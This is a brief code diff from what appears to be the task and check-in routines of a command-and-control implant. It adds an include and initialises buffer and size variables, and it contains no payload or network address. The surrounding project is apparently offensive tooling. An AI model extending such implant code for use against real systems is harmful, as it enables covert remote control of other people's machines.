@@ -1,9 +1,10 @@
+#include "Channel.h"
 #include "Implant.h"
 
 BOOL ImplantSendTasks( DWORD Count ) {
     json       packet;
-    CHAR*      buffer;
-    DWORD      size;
+    CHAR*      buffer           = NULL;
+    DWORD      size             = 0;
     json       TaskRequestArray = json::array();
     json       TaskResultArray  = json::array();
     PTASK_INFO TaskInfo         = NULL;
@@ -47,8 +48,8 @@ BOOL ImplantSendTasks( DWORD Count ) {
 
 BOOL ImplantSendCheckin( json& task, json& response ) {
     json  packet;
-    CHAR* buffer;
-    DWORD size;
+    CHAR* buffer = NULL;
+    DWORD size   = 0;
 
     packet["id"]   = g_Implant.SessionID;
     packet["task"] = task;
